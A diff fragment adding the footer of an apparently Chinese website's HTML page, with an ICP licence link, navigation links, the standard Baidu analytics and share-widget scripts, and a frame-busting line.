+    		<a href="http://www.miibeian.gov.cn/">京ICP备15041338号-1</a>
+    		<!--a href="http://sae.sina.com.cn" target="_blank"><img src="/images/sae_bottom_logo.png" title="Powered by Sina App Engine"></a-->
+    	</span>
+        <span class="other fright">
+                        <a href="/impression">行业观点</a>
+            · <a href="/lawer">法律顾问</a>
+            · <a href="/contactus">联系我们</a>
+            · <a href="/help">帮助</a>
+            · <a href="/about">关于</a>
+        </span>
+    </div>
+	<script type="text/javascript">
+	var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+	document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fc12f88b5c1cd041a732dea597a5ec94c' type='text/javascript'%3E%3C/script%3E"));
+	</script>
+    <script type="text/javascript" id="bdshare_js" data="type=button"></script>
+    <script type="text/javascript" id="bdshell_js"></script>
+    <script type="text/javascript">
+        document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + new Date().getHours();
+        
+        if (top.location !== self.location) top.location=self.location;
+    </script>
+</div></div></body>
+</html>
